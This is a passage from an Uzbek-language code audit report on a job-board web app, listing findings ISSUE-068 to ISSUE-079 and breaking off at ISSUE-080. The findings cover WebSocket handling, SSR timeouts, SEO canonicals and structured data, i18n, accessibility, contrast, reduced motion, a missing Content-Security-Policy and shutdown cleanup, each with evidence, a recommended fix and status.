- **Impact:** Server WS ulanishlari 2x (10k user → 20k potentsial ulanish), ortiqcha polling; real-time bildirishnoma tushib qoladi.
- **Evidence:** useNotifications.ts:63 `new WebSocket(`${WS_URL}/ws/chat?token=...`)`, :79-87 cleanup'da faqat close; useInboxSummary.ts:29 `setInterval(refresh, 20000)`, :31-33 focus+INBOX_CHANGED.
- **Recommended fix:** Bitta umumiy soket: useChatSocket'ni `notification` turini ham qabul qiladigan qilib, AuthProvider darajasida (context) yagona ulanish; useNotifications shu kontekstga obuna bo'lsin. Reconnect'ni useChatSocket'dagi backoff bilan umumiylashtiring. Polling intervallarini `document.visibilityState` bo'yicha to'xtatish.
- **Dependencies:** useChatSocket.ts, NotificationBell.tsx, useMessenger.ts, backend /ws/chat message turlari.
- **Risk:** O'rta: chat va bildirishnoma oqimi bitta ulanishga bog'lanadi.
- **Bajarilgan fix:** Qo'ng'iroq: xatoda son saqlanadi, eskirgan javob e'tiborsiz, WS qayta ulanadi (4401 → refresh), dublikat +1 yo'q. PHASE 6: Qo'ng'iroq xato holati va qayta urinish (ISSUE-118); nishonlar xatoda saqlanadi (ISSUE-132); WS 4401 chegarasi (ISSUE-133).
- **Test/dalil:** web typecheck/build PASS
- **Birlashtirilgan manbalar (6):**
  - R139 [frontend-state, P2] `apps/web/src/lib/useNotifications.ts:61` — Har foydalanuvchi uchun ikkita WebSocket (/ws/chat) ochiladi; bildirishnoma soketida reconnect yo'q
  - R140 [frontend-state, P2] `apps/web/src/lib/useNotifications.ts:45` — useNotifications/useInboxSummary: so'rovlar bekor qilinmaydi — logout yoki token almashganda eskirgan javob holatni yozadi
  - R157 [realtime-notifications, P2] `apps/web/src/lib/useNotifications.ts:61` — Qo'ng'iroq uchun ikkinchi, reconnect'siz WebSocket — uzilsa 12 daqiqagacha jonli bildirishnoma yo'q, har tab 2 socket
  - R158 [realtime-notifications, P2] `apps/web/src/lib/useNotifications.ts:26` — Qo'ng'iroq: API xatosi 'bo'sh' holat sifatida ko'rinadi va 45s polling xatosi mavjud ro'yxat/sonni 0 ga o'chiradi
  - R205 [validation-errors, P2] `apps/web/src/lib/useNotifications.ts:32` — Header qo'ng'iroq/inbox sonlari xatoda 0 ga tushadi va bildirishnoma sozlamalari xatoda bo'sh ro'yxat bo'ladi
  - R246 [realtime-notifications, P3] `apps/web/src/lib/useNotifications.ts:73` — Qo'ng'iroq badge: WS xabari uchun unreadCount ro'yxatdagi dedupe'dan qat'i nazar +1

### ISSUE-068

**useMessenger loadPartner/loadRating xatoda ushlanmaydi: panel 'loading'da qotadi**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** frontend/messages
- **Fayl:** `apps/web/src/lib/messages/useMessenger.ts:315`
- **Root cause:** `fetchUserSummary` (api.ts:864-872) `res.json()` xatosida uloqtiradi; `loadPartner` 315-317 `.then` faqat — reject bo'lsa `partners[id]` 'loading' bo'lib qoladi va qayta chaqiruvda `state !== "error"` sabab qayta so'ralmaydi (313). `loadRating` 290 ham catch'siz.
- **Impact:** Ish beruvchi nomzod panelini ko'ra olmaydi, sahifa yangilanmaguncha; konsolda unhandled rejection.
- **Evidence:** useMessenger.ts:310-320, :288-293.
- **Recommended fix:** `.catch(() => setPartners(prev => ({...prev, [id]: "error"})))`; loadRating uchun ham catch.
- **Dependencies:** Yo'q.
- **Risk:** Past.
- **Bajarilgan fix:** `loadPartner`/`loadRating` xatolari ushlanadi.
- **Test/dalil:** web typecheck/build PASS

### ISSUE-069

**SSR +data fetch'larida timeout yo'q: sekin API barcha ochiq sahifalarni osiltirib qo'yadi**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** PARTIAL
- **Area:** ssr/resilience
- **Fayl:** `apps/web/src/lib/api.ts:62`
- **Root cause:** Server tomonda chaqiriladigan fetcher'lar signal berilmasa timeout'siz ishlaydi: tryFetch (api.ts:60-66), fetchVacancyPage (299), fetchVacancyDetail (336), fetchSimilarVacancies (350), fetchCompanyPage (395), fetchCompanyDetail (443), fetchSimilarCompanies (459), articles/api.ts:12. +data.ts fayllari signal uzatmaydi. apps/web/api/seo.js:39 (sitemap proxy) ham timeout'siz.
- **Impact:** API sekinlashsa har bir SSR so'rov Vercel funksiyasi timeout'igacha (504) osilib qoladi. Barcha ochiq sahifalar (home, /vacancies, detail) ishlamay qoladi, crawl budget yeydi, error-state/retry UI esa hech qachon chizilmaydi.
- **Evidence:** vacancies/+data.ts:15-18 `fetchVacancyPage(toApiParams(query))` signalsiz; index/+data.ts:4-8 Promise.all(fetchStats, fetchVacancies, fetchCompanies) — hammasi tryFetch orqali, AbortSignal yo'q.
- **Recommended fix:** api.ts'da `serverSignal(signal?)` yordamchisini qo'shing: `signal ?? (typeof window === 'undefined' ? AbortSignal.timeout(5000) : undefined)`. Uni tryFetch va barcha public fetcher'larda ishlating. Timeout'ni AbortError emas, ApiError(0) deb qayta tashlang, shunda +data'ning mavjud 'failed' yo'li ishlaydi. seo.js'ga ham `signal: AbortSignal.timeout(8000)` qo'shing.
- **Dependencies:** Detail sahifalar uchun 503 finding'i bilan birga qilish ma'qul
- **Risk:** Past: Node 20 AbortSignal.timeout'ni qo'llaydi; hozirgi catch'lar faqat AbortError nomini alohida tekshiradi, shuning uchun timeout xatosini ApiError'ga aylantirish shart.
- **Bajarilgan fix:** SSR'da API so'rovlariga 8 s timeout (`withServerTimeout`) — `api.ts` fetcher'lari. `lib/articles/api.ts` qamrab olinmadi.
- **Test/dalil:** web typecheck/build PASS

### ISSUE-070

**Detail sahifalarda (vakansiya/kompaniya/maqola) API xatosi HTTP 200 + noindex bilan qaytadi: vaqtinchalik nosozlik sahifani indeksdan chiqaradi**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** NOT FIXED
- **Area:** seo/status
- **Fayl:** `apps/web/src/pages/vacancies/@slug/+Head.tsx:34`
- **Root cause:** +data.ts ApiError'da `vacancy: null` qaytaradi (vacancies/@slug/+data.ts:17), sahifa 200 bilan chiziladi, +Head esa `noindex` qo'yadi. companies/@slug (+data.ts:17, +Head.tsx:23-24) va articles/@slug (+data.ts:19, +Head.tsx:27-28) ham xuddi shunday.
- **Impact:** API bir necha soniya sekin yoki o'chiq bo'lganda Googlebot o'sha paytda kirsa, faol vakansiya/kompaniya/maqola sahifasi indeksdan chiqadi. Qayta indekslanishi kunlab cho'ziladi. 5xx ishlatilganda bot keyinroq qaytib keladi, noindex'da esa qaytmaydi.
- **Evidence:** vacancies/@slug/+data.ts:17 `if (error instanceof ApiError) return { vacancy: null, failed: true }`; +Head.tsx:34-35 `if (!vacancy) return <Seo ... noindex />`; +title.ts xato sarlavhasini beradi, status kodi o'zgarmaydi.
- **Recommended fix:** Faqat SSR'da (`typeof window === 'undefined'`) ApiError bo'lsa `throw render(503, VACANCY_UNAVAILABLE)` qiling. _error sahifasi shu abortReason uchun mavjud Retry holatini (VacancyDetailError) ko'rsatsin, noindex'siz. Client navigatsiyada hozirgi `null` + retry xatti-harakati qolsin. Uchala detail sahifaga ham qo'llang.
- **Dependencies:** _error/+Page.tsx va +Head.tsx'ga yangi abortReason tarmoqlari; useVacancyDetail/useCompanyDetail/useArticleDetail hook'lari
- **Risk:** O'rta: Vike render(503) client-side navigatsiyada ham _error'ni chizadi, shuning uchun faqat server tomonda qo'llash kerak.
- **Bajarilgan fix:** Detail sahifalar API xatosida 200 + noindex bo'lib qoldi (D-027).
- **Test/dalil:** —

### ISSUE-071

**Canonical va hreflang query param'larni tashlaydi: sitemap'dagi /salaries?category= URL'lari o'z canonical'iga zid; /vacancies?q= da noindex yo'q**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** NOT FIXED
- **Area:** seo/canonical
- **Fayl:** `apps/web/src/lib/i18n/head.ts:25`
- **Root cause:** useHead canonical'ni faqat logical pathname'dan quradi. HeadDefault.tsx:52-55 dagi alternates ham shunday. Natijada sitemap-static'dagi `/salaries?category=X` va `/salaries?region=Y` (seo.routes.ts:91-94) sahifalarining canonical'i `/salaries` bo'ladi. /vacancies?page=2, /companies?..., /articles?page=N ham 1-sahifaga canonical qilinadi. /vacancies?q= sarlavhasi so'rovga moslashadi (vacancies/+Head.tsx:12-13), lekin noindex yo'q (articles'da bor: articles/index/+Head.tsx:28).
- **Impact:** Sitemap'dagi yuzlab maosh URL'lari 'canonical boshqa sahifa' deb indeksdan chiqariladi, ya'ni sitemap'dagi kasb/hudud bo'yicha maosh sahifalari organik trafik bermaydi. Sahifalashdagi vakansiyalar kashf qilinmaydi. Cheksiz ?q= kombinatsiyalari 'duplicate, Google chose different canonical' shovqinini beradi. ItemList JSON-LD filtrlangan sahifalarda ham chiqadi.
- **Evidence:** head.ts:25 `canonical: `${SITE_ORIGIN}${localizeHref(logical, locale)}``; seo.routes.ts:92 `/salaries?category=${c.slug}`; salaries/+Head.tsx:12 `canonical={canonical}`; vacancies/+Head.tsx:31 noindex'siz.
- **Recommended fix:** useHead'ga `canonicalParams?: string[]` opsiyasini qo'shing. U whitelist param'larni saqlaydi va tartiblaydi (salaries: category, region; vacancies/companies/articles: page>1). alternates ham shu param'larni olsin. /vacancies va /companies'da `q` (va saved=1) bo'lsa `noindex` qo'ying. Aks holda salaries sitemap yozuvlarini olib tashlang — ikkalasidan biri izchil bo'lsin.
- **Dependencies:** seo.routes.ts sitemap-static; HeadDefault.tsx alternates
- **Risk:** Past: faqat meta teglar; canonical'dagi param tartibi sitemap URL'lari bilan bir xil bo'lishi kerak.
- **Bajarilgan fix:** Canonical/hreflang parametrlari o'zgartirilmadi (D-031).
- **Test/dalil:** —

### ISSUE-072

**JobPosting: baseSalary valyutasi doim UZS, sameAs ichki sahifa, validThrough amalda yo'q**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** PARTIAL
- **Area:** seo/jsonld
- **Fayl:** `apps/web/src/pages/vacancies/@slug/+Head.tsx:95`
- **Root cause:** (1) Vacancy.currency mavjud (schema.prisma:412), lekin VM'ga o'tmaydi (lib/vacancies/detail.ts:175-190) va +Head 'UZS' deb qattiq yozadi. (2) sameAs (69-qator) kompaniyaning o'z sayti o'rniga ISH BOR!'dagi /companies/:slug'ga ishora qiladi. (3) validThrough faqat expiresAt bo'lsa qo'yiladi, API'da esa Vacancy.expiresAt hech qayerda o'rnatilmaydi va tekshirilmaydi (grep: api src'da vakansiya expiresAt ishlatilmaydi). Vakansiyalar abadiy active qoladi. (4) employment 'remote' → FULL_TIME (13-qator).
- **Impact:** USD'dagi maosh Google Jobs'da so'mda ko'rinadi, ya'ni to'qima ma'lumot (product rule 4). sameAs noto'g'ri entity bog'lanishini beradi. validThrough yo'qligi va eskirgan e'lonlarning yopilmasligi Google Jobs'da 'expired job' ogohlantirishlariga va sifat pasayishiga olib keladi.
- **Evidence:** +Head.tsx:94-95 `currency: "UZS"`; :69 `sameAs: `${ORIGIN}${localizeHref(`/companies/${company.slug}`, locale)}``; :59 `...(vacancy.expiresAt ? { validThrough } : {})`; detail.ts:190 salary {min,max,type} — currency yo'q.
- **Recommended fix:** VM salary'ga `currency: str(raw?.currency) ?? 'UZS'` qo'shib, +Head'da ishlating. sameAs'ni `company.website` bo'lsa shu bilan to'ldiring, aks holda `url` maydoniga ichki sahifani qo'ying. Vakansiya faollashtirilganda expiresAt = publishedAt + 30 kun o'rnatish va muddati o'tganlarni `closed`/`archived` qiluvchi sweep qo'shish uchun product qarori kerak; hozircha kamida sitemap'da publishedAt'ga qarab eski e'lonlarni cheklash.
- **Dependencies:** lib/vacancies/detail.ts VM tipi; API createVacancy/admin status o'tishlari (expiresAt uchun)
- **Risk:** Past (currency/sameAs); O'rta (expiresAt sweep — mavjud vakansiyalarni yopib qo'yishi mumkin, backfill kerak).
- **Bajarilgan fix:** JobPosting `baseSalary.currency` vakansiya valyutasidan, `sameAs` kompaniya sayti. `validThrough` qilinmadi.
- **Test/dalil:** web typecheck/build PASS

### ISSUE-073

**Backend o'zbekcha xato matnlari, zod inglizcha default xabarlari va o'zbekcha bildirishnoma matnlari RU/EN interfeysda xom ko'rinadi; hudud nomlari ba'zi joylarda tarjimasiz; 429 xabari inglizcha**

- **Severity:** P2 (agent bahosi: P2, P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** NOT FIXED
- **Area:** i18n
- **Fayl:** `apps/api/src/server.ts:115`
- **Root cause:** Ko'p zod sxemada custom message yo'q (auth.routes.ts:13-14 `z.string().email()`, `.min(8)`; vacancies.routes.ts:42-43 `title: z.string().min(3)`, `description: z.string().min(10)`, :59 email). Error handler `${field}: ${issue.message}` qaytaradi. Signup parol input'ida minLength yo'q.
- **Impact:** Signup'da 8 belgidan qisqa parol kiritilsa o'zbek, rus va ingliz interfeyslarida ham 'password: String must contain at least 8 character(s)' chiqadi (pages/signup/+Page.tsx:52 err.message'ni ko'rsatadi). Aralash til, texnik maydon nomi.
- **Evidence:** server.ts:115-119; auth.routes.ts:13-14; components/AuthForm.tsx:116-124 (PasswordField input: required bor, minLength yo'q), holbuki messages.uz.ts:368 passwordHint 'Kamida 8 belgi'; vacancies.routes.ts:42-43,59.
- **Recommended fix:** 1) AuthForm PasswordField'ga ixtiyoriy minLength prop qo'shing va signup'da minLength={8} bering (brauzer validatsiyasi lokalizatsiyalangan). Bundan tashqari submit'dan oldin t.signup.passwordHint bilan client tekshiruv qiling. 2) Backend zod sxemalariga o'zbekcha custom message bering. 3) VALIDATION_ERROR javobiga `field` maydonini alohida qo'shing, shunda frontend t.* bilan tarjima qila oladi.
- **Dependencies:** Topilma #2 dagi umumiy errorText helper
- **Risk:** Past
- **Bajarilgan fix:** Backend xabarlarining to'liq i18n'i qilinmadi (mavjud `errorText`: uz'da server matni, boshqa tillarda umumiy).
- **Test/dalil:** —
- **Birlashtirilgan manbalar (6):**
  - R141 [i18n, P2] `apps/api/src/server.ts:115` — Zod default inglizcha xabarlari maydon nomi bilan birga uch tilda ham chiqadi
  - R142 [i18n, P2] `apps/web/src/components/notifications/NotificationCard.tsx:45` — Bildirishnoma title/body bazaga o'zbekcha matn sifatida yoziladi va RU/EN'da xom ko'rsatiladi
  - R143 [i18n, P2] `apps/web/src/lib/api.ts:227` — Hudud nomlari ba'zi joylarda backend'dagi o'zbekcha nom bilan chiqadi (regionName tarjimasi chetlab o'tilgan)
  - R144 [i18n, P2] `apps/web/src/pages/login/+Page.tsx:34` — Backend o'zbekcha xato matni RU/EN interfeysda to'g'ridan-to'g'ri ko'rsatiladi
  - R224 [i18n, P3] `apps/api/src/server.ts:103` — 429 rate-limit xabari inglizcha va o'zbek interfeysida ham chiqadi
  - R226 [i18n, P3] `apps/web/src/lib/api.ts:244` — Sharh muallifi fallback'i qattiq yozilgan "Nomzod" — RU/EN vakansiya sahifasida o'zbekcha

### ISSUE-074

**Mobil menyu client-side navigatsiyadan keyin ochiq qolib ketadi**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** ui/navigation
- **Fayl:** `apps/web/src/components/Header.tsx:38`
- **Root cause:** `menuOpen` state Header'da, Header esa Layout ichida (vike-react `extends: vikeReact`, clientRouting sukut bo'yicha yoqilgan) va sahifalar orasida qayta mount qilinmaydi. Mobil nav havolalarida (288-298, 313-325) `onClick={() => setMenuOpen(false)}` yo'q, pathname o'zgarganda yopadigan useEffect ham yo'q (faylda useEffect umuman yo'q). Desktop user menyusida esa `onClick={() => setUserOpen(false)}` bor (213).
- **Impact:** Telefonda menyudan bo'lim tanlanganda yangi sahifa ochiladi, lekin menyu paneli ochiq turib kontentni pastga suradi. Foydalanuvchi uni qo'lda yopishi kerak. Esc va tashqariga bosish ham ishlamaydi.
- **Evidence:** Header.tsx:38 `const [menuOpen, setMenuOpen] = useState(false);`, :288-298 `<a key={link.href} href={l(link.href)} ...>` (onClick yo'q), :313-325 mobileAccountLinks ham shunday. pages/+config.ts: `Layout, ... extends: vikeReact`.
- **Recommended fix:** `useEffect(() => { setMenuOpen(false); setUserOpen(false); }, [pathname, pageContext.urlOriginal]);` qo'shing. Mobil havolalarga ham `onClick={() => setMenuOpen(false)}` bering. Menyu uchun `id` + `aria-controls` va Esc bilan yopish qo'shing.
- **Dependencies:** Brauzer testida clientRouting xatti-harakatini tasdiqlash.
- **Risk:** Juda past.
- **Bajarilgan fix:** Header: client-side navigatsiyadan keyin mobil va akkaunt menyulari yopiladi.
- **Test/dalil:** web typecheck/build PASS

### ISSUE-075

**A11y: qo'ng'iroq aria-label sonni yashiradi, popover'larda Esc yo'q, qidiruv inputlarida label yo'q, custom Select klaviaturasiz, StarInput semantikasi, dialoglarda overflow, skip link yo'q, fokus indikatori sust, drawer fokus tuzog'i nusxasi**

- **Severity:** P2 (agent bahosi: P2, P3)
- **Verdict:** PLAUSIBLE (audit agenti topgan, mustaqil qayta tekshirilmagan)
- **Holat:** PARTIAL
- **Area:** a11y
- **Fayl:** `apps/web/src/components/NotificationBell.tsx:26`
- **Root cause:** Tugmada `aria-label={t.notifications.title}` bor. aria-label ichki matnni, jumladan 99+ badge'ni, accessible name'dan chiqarib tashlaydi. Popover'da `aria-haspopup`, `aria-controls` va Esc handler yo'q. Header account menyusi (Header.tsx:165-237) va LanguageSwitcher ham faqat click-outside bilan yopiladi, fokus trigger'ga qaytmaydi.
- **Impact:** Screen reader foydalanuvchisi o'qilmagan bildirishnomalar borligini bilmaydi. Klaviaturada popover'ni Esc bilan yopib bo'lmaydi va Tab fokusni ochiq popover ortidan sahifaga olib ketadi.
- **Evidence:** NotificationBell.tsx:24-27 `aria-expanded={open} aria-label={t.notifications.title}`, :38-42 badge `{unreadCount > 99 ? "99+" : unreadCount}` button ichida. onKeyDown/Escape yo'q (1-91-qatorlar). Header.tsx:165-170 user menu tugmasi `aria-expanded aria-controls="account-menu"`, lekin Escape handler butun faylda yo'q.
- **Recommended fix:** aria-label'ni `unreadCount > 0 ? `${title}, ${t.notifications.unread(unreadCount)}` : title` qiling va badge span'ga aria-hidden bering. Umumiy kichik `useEscape(open, close, triggerRef)` hook yozing (ActionsMenu.tsx:40-45 dagi mantiq) va NotificationBell, Header user menu, LanguageSwitcher'da ishlating.
- **Dependencies:** i18n: unread soni uchun matn funksiyasi (uz/ru/en).
- **Risk:** Past.
- **Bajarilgan fix:** Qo'ng'iroq aria-label o'qilmaganlar soni bilan, badge aria-hidden; nomzodlar qidiruviga label. Select/StarInput klaviatura va popover Esc qilinmadi.
- **Test/dalil:** web typecheck/build PASS
- **Birlashtirilgan manbalar (8):**
  - R160 [responsive-dark-a11y, P2] `apps/web/src/components/NotificationBell.tsx:26` — Bildirishnoma qo'ng'irog'i aria-label o'qilmagan sonni yashiradi; header popover'larida Esc/aria-haspopup yo'q
  - R162 [responsive-dark-a11y, P2] `apps/web/src/components/SearchBar.tsx:31` — Bir nechta qidiruv/filtr inputlarida label yo'q (faqat placeholder)
  - R163 [responsive-dark-a11y, P2] `apps/web/src/components/Select.tsx:51` — Custom Select va LanguageSwitcher: fokus ko'rinmaydi, klaviatura navigatsiyasi va Esc yo'q, listbox semantikasi noto'g'ri
  - R164 [responsive-dark-a11y, P2] `apps/web/src/components/StarRating.tsx:44` — StarInput: yulduz tugmalari faqat '1'..'5' deb nomlangan va tanlangan holat e'lon qilinmaydi
  - R165 [responsive-dark-a11y, P2] `apps/web/src/components/employer/applications/ApplicationStatusDialog.tsx:85` — Markaziy dialoglarda max-height/overflow yo'q: telefonda klaviatura ochilganda kontent ekrandan chiqib ketadi
  - R247 [responsive-dark-a11y, P3] `apps/web/src/components/Layout.tsx:24` — 'Asosiy kontentga o'tish' (skip link) yo'q
  - R248 [responsive-dark-a11y, P3] `apps/web/src/components/SearchBar.tsx:24` — Bosh sahifa qidiruv maydonida fokus indikatori deyarli ko'rinmaydi
  - R249 [responsive-dark-a11y, P3] `apps/web/src/components/companies/CompanyFilterDrawer.tsx:46` — Filtr drawer'lari useDialog o'rniga fokus tuzog'ining nusxasini ishlatadi va farqlari bor

### ISSUE-076

**Kontrast: text-dusk/80 kunduzgi rejimda 3.59:1, tungi text-signal 3.96:1, tungi bg-signal ustidagi oq matn 4.47:1**

- **Severity:** P2 (agent bahosi: P2, P3)
- **Verdict:** PLAUSIBLE (audit agenti topgan, mustaqil qayta tekshirilmagan)
- **Holat:** NOT FIXED
- **Area:** a11y/contrast
- **Fayl:** `apps/web/src/components/NotificationBell.tsx:122`
- **Root cause:** `--dusk` (#5A6A85) surface ustida 5.48:1, lekin /80 alpha'da 3.59:1, /70 da 2.95:1 ga tushadi. Bu klass 11-14px ikkilamchi matnlarga ishlatilgan. text-ink/55 esa 4.00:1.
- **Impact:** Bildirishnoma turi (11px), vakansiya kartasidagi e'lon sanasi (text-xs), rezyumedagi 'to'ldirilmagan' belgilari va form placeholder'lari zaif ko'ruvchi foydalanuvchiga o'qilmaydi.
- **Evidence:** NotificationBell.tsx:122 `text-[11px] text-dusk/80`, VacancyCard.tsx:51 `text-xs text-dusk/80`, profile/ResumePreview.tsx:22 `italic text-dusk/80`, profile/ResumeWizard.tsx:263, profile/ProfileOverview.tsx:251, profile/ui.tsx:181 (11px counter). placeholder:text-dusk/70|80 9 joyda, masalan vacancies/detail/ReportDialog.tsx:79. Hisob: mix(dusk, white, .8) = 3.59:1.
- **Recommended fix:** Matn uchun alpha'siz `text-dusk` ishlating (5.48:1). Placeholder'lar uchun `placeholder:text-dusk` ga o'ting. Dekorativ ikonkalar (ApplicationCard.tsx:150 kabi) qolishi mumkin. Disabled pagination (text-dusk/50, aria-hidden) istisno.
- **Dependencies:** Yo'q.
- **Risk:** Juda past (faqat rang).
- **Bajarilgan fix:** Kontrast tokenlari — dizayn tizimi qarori (D-031).
- **Test/dalil:** —
- **Birlashtirilgan manbalar (3):**
  - R161 [responsive-dark-a11y, P2] `apps/web/src/components/NotificationBell.tsx:122` — text-dusk/80 (va placeholder dusk/70-80) kunduzgi rejimda 3.59:1, kichik matnlarda AA'dan o'tmaydi
  - R166 [responsive-dark-a11y, P2] `apps/web/src/styles/global.css:49` — Tungi rejimda text-signal matni AA kontrastdan o'tmaydi (surface'da 3.96:1, signal-soft'da 3.51:1)
  - R254 [responsive-dark-a11y, P3] `apps/web/src/styles/global.css:49` — Tungi bg-signal ustidagi oq matn 4.47:1 (izohda 4.9:1 deyilgan); tungi danger tugmasi alohida qo'lda tuzatilgan

### ISSUE-077

**prefers-reduced-motion ataylab e'tiborsiz qoldirilgan: cheksiz fon animatsiyalarini to'xtatib bo'lmaydi**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** NOT FIXED
- **Area:** a11y/motion
- **Fayl:** `apps/web/src/styles/global.css:419`
- **Root cause:** global.css:419-420 izohida 'brend talabi — prefers-reduced-motion bilan animatsiya o'chirilmaydi' deyilgan. drift-a/b/c (11-17s infinite), .particle rise, .text-shine (8s infinite), float, breathe, spin-slow, pulse-ring doim ishlaydi. Pauza boshqaruvi ham yo'q.
- **Impact:** WCAG 2.2.2 (Pause, Stop, Hide, A darajasi: 5 soniyadan uzun avtomatik harakat) va 2.3.3 buzilgan. Vestibular kasalligi bor foydalanuvchida bosh aylanishi/ko'ngil aynishi chaqirishi mumkin. Doimiy GPU animatsiyasi past quvvatli telefonlarda batareyani ham sarflaydi.
- **Evidence:** global.css:231-233 `.drift-a { animation: drift-a 14s ease-in-out infinite; }`, :254 `.particle { animation: rise linear infinite; }`, :353 `.text-shine ... animation: shine-move 8s linear infinite`, :281/:285/:292 pulse-ring/spin-slow/breathe infinite. motion-reduce faqat 2 joyda: SalaryDistributionChart.tsx:63 va SalaryExperienceChart.tsx:61.
- **Recommended fix:** global.css oxiriga `@media (prefers-reduced-motion: reduce) { .drift-a,.drift-b,.drift-c,.particle,.text-shine,.pulse-ring,.spin-slow,.breathe,.animate-float { animation: none !important; } .reveal-pending { opacity:1; transform:none; } html { scroll-behavior:auto; } }` qo'shing. Brend fon statik holatda qoladi, faqat harakat to'xtaydi.
- **Dependencies:** Mahsulot egasi bilan 'brend talabi' izohini qayta kelishish kerak (DESIGN.md).
- **Risk:** Past: faqat reduce sozlamasi yoqilgan foydalanuvchilarga ta'sir qiladi.
- **Lead auditor izohi:** global.css va CHANGELOG 0.2.1 da brend talabi sifatida hujjatlashtirilgan.
- **Bajarilgan fix:** Reduced motion — DESIGN.md dagi brend qarori; qaror kerak.
- **Test/dalil:** —

### ISSUE-078

**Web (Vike) origin'ida Content-Security-Policy umuman yo'q**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** NOT FIXED
- **Area:** security/csp
- **Fayl:** `apps/web/vercel.json:232`
- **Root cause:** vercel.json:232-245, server/index.mjs:40-45, vite.config.ts:8-13 — faqat nosniff/XFO/COOP/Referrer-Policy (+HSTS Vercel'da). CSP yo'q, shuning uchun JSON-LD kabi har qanday HTML injection to'g'ridan-to'g'ri script ishga tushiradi va localStorage'dagi access tokenni oladi. API'da (server.ts:63) 'unsafe-inline' — API HTML bermaydi, lekin /uploads/ SVG uchun aynan shu zaif nuqta.
- **Impact:** XSS'ga qarshi ikkinchi qatlam himoya yo'q; bitta injection = token o'g'irlash. Self-hosted (server/index.mjs) da ham HSTS yo'q.
- **Evidence:** vercel.json:234-244 headers ro'yxatida CSP yo'q; server/index.mjs:40-45 SECURITY_HEADERS; server.ts:63 `scriptSrc: ["'self'", "'unsafe-inline'"...]`.
- **Recommended fix:** Web'ga: `Content-Security-Policy: default-src 'self'; script-src 'self' 'sha256-<THEME_INIT_SCRIPT>' https://accounts.google.com; connect-src 'self' <API_URL> wss://<API_HOST> https://accounts.google.com; img-src 'self' data: https:; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com data:; frame-src https://accounts.google.com; object-src 'none'; base-uri 'self'` (avval Report-Only). API'da `scriptSrc: ["'self'"]` (API HTML bermaydi, inline kerak emas) va /uploads/ uchun sandbox CSP.
- **Dependencies:** JSON-LD fix'i; Google GIS, HMR (dev'da alohida), THEME_INIT_SCRIPT hash'i
- **Risk:** O'rta — noto'g'ri CSP saytni sindiradi; Report-Only bilan boshlash
- **Bajarilgan fix:** Web CSP qo'shilmadi (inline skript hash'i va deploy manzillarini tekshirish kerak, D-031).
- **Test/dalil:** —

### ISSUE-079

**Shutdown'da Telegram bot sikli va alert timer to'xtatilmaydi, timeout yo'q; getMe bir marta yiqilsa bot restartgacha o'chiq**

- **Severity:** P3 (agent bahosi: P2, P3)
- **Verdict:** PLAUSIBLE (audit agenti topgan, mustaqil qayta tekshirilmagan)
- **Holat:** FIXED
- **Area:** infra/lifecycle
- **Fayl:** `apps/api/src/server.ts:208`
- **Root cause:** realtime.ts:10 sockets Map; telegram.service.ts:55,87 link/login token Map'lari; rate-limit memory store (server.ts:103); setInterval (alerts.service.ts:184-202); for(;;) getUpdates (telegram.service.ts:329). Shutdown handler (server.ts:208-223) faqat app.close + prisma.$disconnect qiladi: bot loop va alert timer ishlashda davom etadi, app.close uchun majburiy timeout yo'q. numReplicas: 1 (railway.json:13) bo'lsa ham Railway yangi konteynerni eskisi to'xtamasdan ko'taradi.
- **Impact:** Deploy paytida ikkala nusxa getUpdates → Telegram 409 va alert sweep ikki marta, ya'ni takroriy email/push. Restart'da Telegram orqali kirayotgan foydalanuvchilar token'i yo'qoladi ('expired'). $disconnect'dan keyin loop Prisma'ga murojaat qilib xato loglaydi. app.close osilib qolsa SIGKILL.
- **Evidence:** server.ts:201-203,208-223; realtime.ts:10; telegram.service.ts:55,87,327-348; alerts.service.ts:184-202; railway.json:13; DEPLOY.md:89-93.
- **Recommended fix:** telegram.service'da `let stopped=false; export function stopTelegramBot(){stopped=true}` va loop `while(!stopped)`; alerts'da `stopAlertScheduler(){clearInterval(timer)}`; shutdown'da avval shularni, keyin app.close, hammasini `setTimeout(()=>process.exit(1),10_000).unref()` bilan o'rang. Alert sweep dublikatiga qarshi DB lease: savedSearch.lastCheckedAt'ni shartli updateMany bilan 'claim' qiling. Single-instance cheklovini README/DEPLOY'da ro'yxat sifatida yozing (rate-limit, WS, login token'lar).
- **Dependencies:** Yo'q
- **Risk:** Past.
- **Bajarilgan fix:** Shutdown: 10 s majburiy chiqish, obuna jadvali, Telegram bot va heartbeat to'xtatiladi; bot getMe backoff bilan.
- **Test/dalil:** API typecheck/build PASS; e2e server SIGTERM bilan to'xtaydi
- **Birlashtirilgan manbalar (2):**
  - R197 [tests-infra, P2] `apps/api/src/server.ts:208` — Jarayon ichidagi holat (WS sockets, Telegram login token'lari, rate-limit store, alert timer, bot long-poll) — deploy overlap'da dublikat/409; SIGTERM'da loop va timer to'xtatilmaydi, timeout yo'q
  - R244 [realtime-notifications, P3] `apps/api/src/modules/telegram/telegram.service.ts:318` — Telegram bot: startup'da getMe bir marta muvaffaqiyatsiz bo'lsa bot restartgacha o'chiq; long-poll siklini to'xtatish yo'q

### ISSUE-080

**/pricing dead code, admin to'lovlar paneli va 'Daromad' kartasi, demo seed tarif/to'lov yozuvlari, bo'sh support 'payments' kategoriyasi; isPremium (admin qo'lda) product rule'ga mos**

